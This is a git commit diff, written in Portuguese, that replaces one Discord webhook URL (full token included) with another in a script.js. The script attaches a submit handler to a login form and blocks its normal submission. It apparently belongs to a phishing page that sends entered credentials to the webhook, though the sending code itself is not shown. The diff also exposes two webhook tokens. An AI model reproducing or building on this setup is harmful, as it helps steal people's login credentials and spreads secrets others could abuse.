118be7f19b645ec2dfc32847f17692effcda1a77
sx-58 <yagamidev01@proton.me>
2026-03-11 19:56:23 -0300

    Atualizar o script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1481402603404525678/LDGdRvAZJZEbG22rhkms1kmKt1XQ4oglVGE_cYOu0qWRi-y_fjE0GjZ8oAe2jwi28WI1";
+const webhookURL = "https://discord.com/api/webhooks/1481425433802178784/2ueg8z9F0edNbyh94cQBqQ2tQPV21TcoOQjrHg5NFIBpD3chAxd0Lm-MVI8xN9t98b8g";
 
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
